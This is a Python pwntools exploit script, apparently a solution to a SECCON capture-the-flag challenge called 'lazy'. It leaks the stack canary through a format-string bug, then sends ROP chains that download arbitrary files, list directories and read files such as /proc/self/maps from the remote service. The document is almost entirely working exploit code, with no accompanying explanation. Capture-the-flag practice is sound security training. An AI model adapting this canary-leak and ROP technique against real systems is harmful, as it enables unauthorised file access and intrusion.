#!/usr/bin/env python3

from pwn import *
context(arch="amd64", terminal=["tmux", "neww"])
#r = process("./lazy", env={"HOME":"/mnt/lazy"})
b = ELF("./lazy")
rop = ROP(b)
buf = 0x602530

def login_get_canary(r):
    r.sendline(str(2))
    r.sendline("_H4CK3R_")
    r.sendline("3XPL01717")

    r.sendline(str(4))
    r.sendline("%9$llx")
    r.recvuntil("Filename : ")
    return int(r.recvline().strip(), 16)

def download(path, fname):
    r = remote("lazy.chal.seccon.jp", 33333)
    canary = login_get_canary(r)

    r.sendline(str(4))
    payload = b"file".ljust(0x18, b'\x00')
    payload += flat([
        canary, 0,
        rop.rdi.address, buf,
        b.symbols['input'],
        rop.rdi.address, buf,
        b.symbols['download']
    ])

    r.sendline(payload)
    r.sendline(path + "a\x00")
    r.recvuntil('Sending ')
    size = int(r.recvuntil(' bytes', drop=True))
    print("Size :", size)
    data = r.recvall()
    with open(fname, 'wb') as f:
        f.write(data)
        print('write', len(data), 'bytes to', fname, '.')

def list_dir(path):
    print(path, ':')
    r = remote("lazy.chal.seccon.jp", 33333)
    canary = login_get_canary(r)

    r.sendline(str(4))
    payload = b"file".ljust(0x18, b'\x00')
    payload += flat([
        canary,
        0, # rbp
        rop.rdi.address,
        0x602a00, # rdi
        b.symbols['input'],
        rop.rdi.address,
        0x602a00, # rdi
        b.plt['chdir'],
        b.symbols['listing'],
    ])
    r.sendline(payload)
    r.sendline(path + "\x00")
    r.recvuntil('file!')
    r.recvuntil('file!')
    print(r.recvall().decode()[1:])

def readfile(path):
    print('read', path, ':')
    r = remote("lazy.chal.seccon.jp", 33333)
    canary = login_get_canary(r)

    r.sendline(str(4))
    payload = b"file".ljust(0x18, b'\x00')
    payload += flat([
        canary, 0,
        rop.rdi.address, buf,
        b.symbols['input'],
        rop.rdi.address, buf,
        rop.rsi.address, constants.O_RDONLY.real, 0,
        b.plt['open'],

        rop.rdi.address, buf,
        b.plt['strlen'], # use strlen to modify rdx

        rop.rdi.address, 3,
        rop.rsi.address, buf, 0,
        b.plt['read'],
        rop.rdi.address, buf,
        b.plt['puts'],
    ])

    r.sendline(payload)
    r.sendline(path + "\x00")
    r.recvuntil('file!')
    r.recvuntil('file!')
    print(r.recvall().decode())

context.log_level = 'error'
list_dir('.')
list_dir('../shimizu')
readfile('/proc/self/maps')
